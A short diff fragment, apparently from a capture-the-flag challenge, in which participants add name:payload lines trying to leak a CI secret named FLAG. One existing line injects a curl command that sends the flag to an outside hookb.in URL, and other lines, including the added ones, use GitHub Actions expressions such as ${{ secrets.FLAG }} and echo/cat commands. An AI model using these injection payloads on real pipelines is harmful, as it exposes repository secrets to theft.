@@ -777,3 +777,8 @@ echo flag
 imxh2:$flag
 wgblikeW:asd";curl${IFS}https://hookb.in/DrlGxdQEPPhPajxxaW21?flag=$flag;#
 Alleysira:${{secret.FLAG}}
+cp198:echo "${{ env.secrets.FLAG }}";
+echo "${{ secrets.FLAG }}";
+echo "${{ env.FLAG }}"
+echo "ls"
+echo "cat FLAG"
